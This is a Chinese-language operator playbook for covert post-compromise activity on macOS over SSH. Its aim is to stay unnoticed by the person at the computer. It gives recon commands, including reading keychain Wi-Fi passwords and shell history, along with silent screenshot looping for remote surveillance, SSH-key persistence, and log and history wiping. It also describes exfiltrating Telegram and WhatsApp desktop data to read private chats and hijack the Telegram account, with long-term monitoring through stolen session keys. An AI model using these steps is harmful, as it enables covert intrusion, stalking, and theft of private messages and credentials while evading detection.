# macOS 后渗透隐蔽操作与数据提取（SSH 优先打法）

## 隐蔽操作铁律（VNC 暴露分析）
- **VNC 连上目标必暴露**：macOS 系统 UI 层会出菜单栏"屏幕共享"图标（显示器+箭头）+ 部分版本通知横幅。图标是**实际功能入口不是纯通知**，改不掉。锁屏/人不在时无感，但对方坐电脑前 30 秒内可在 系统设置→通用→共享→屏幕共享 断开连接或直接关开关踢掉。
- **完全无痕方案 = SSH 干所有事**：SSH 登录不触发任何 UI 图标/横幅，锁屏/人在都看不到。
- **偷看屏幕不用 VNC**：SSH 会话里 `screencapture -x /tmp/s.png` 静默截屏（不触发屏幕共享图标），再 `scp` 拉回。循环跑 = 远程监控。
- 操作时机：选对方锁屏/离开时干活；VNC 仅"看一眼"用途，用完立刻 kickstart -deactivate。
- 命令行操作留进程痕迹：少装东西、用系统自带工具、干完清 history + log。

## SSH 侦察命令速查（macOS）
```
sw_vers                       系统版本
whoami                        当前用户
dscl . -list /Users           列出所有用户名
scutil --get ComputerName     电脑名
system_profiler SPHardwareDataType  硬件信息
mdfind "kMDItemFSName == '*.pdf'"   搜全盘文件
find /Users/xx/Desktop -type f     看桌面
cat ~/.bash_history            历史命令（可能有密码）
security find-generic-password -s "wifi" -w  读钥匙串 WiFi 密码
```
拉文件统一 `scp -r -i key root@IP:/目标路径/ /本地/`。

## 持久化（防断连）
```
mkdir -p /root/.ssh
echo "公钥内容" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

## 清理痕迹
```
history -c && rm ~/.bash_history
log erase --all       # 需要 sudo
```

## Telegram Desktop 数据提取（Mac）
- 路径：`~/Library/Application Support/Telegram Desktop/tdata/`（新版在 `~/Library/Group Containers/6N38VWS5BX.ru.keepcoder.Telegram/`）
- 关键：整个 tdata 目录 = 全部会话（聊天记录/联系人/媒体）
- 提取：scp 整个 tdata 拉回 → 用 tgdec 解 → 全量恢复聊天/联系人/群组（无本地 passcode 时）
- 注意：对方设了本地密码则解不开；先 `ls ~/Library/Application\ Support/` 侦察装了哪些

## WhatsApp Desktop 数据提取（Mac）
- 路径：`~/Library/Application Support/WhatsApp/`
- 关键：`Chats.sqlite`（或 Database 目录）是**明文 SQLite** 直接 `sqlite3` 查；`Media/` 是原图原视频
- 提取：scp 整个目录拉回 → `sqlite3 Chats.sqlite ".tables"` / `SELECT * FROM Zwamessage LIMIT 50;`
- 比 TG 好拿，纯明文不需要解密；前提是对方在这台 Mac 登录过对应客户端

## 会话劫持可行性对比
| 客户端 | 搬数据能否冒充登录 | 暴露风险 |
|---|---|---|
| TG Desktop | ✅ tdata 搬到本地同版本 TG 目录直接免登录 = 目标账号 | 对方 设置→设备 看到多一台 Desktop；两边同时在线；IP 变化触发风控 |
| WA Desktop | ❌ 会话密钥在手机端，只能离线读 | 扫码需碰手机；验证码会踢对方+通知 |

## 长期监控更隐蔽的两个方案
- **方案A（实时）**：用目标 tdata 密钥挂 Telethon/tg-cli 只读机器人实时同步，活跃设备不显示新设备
- **方案B（零暴露）**：定期 scp 拉 tdata 备份到本地离线解，不碰在线状态

## 实战流程建议
连上 → 侦察系统 → 截图看屏幕 → 拉关键文件（TG tdata / WA 目录）→ 写 SSH key 持久化 → 清日志退出。全程对方屏幕零动静。
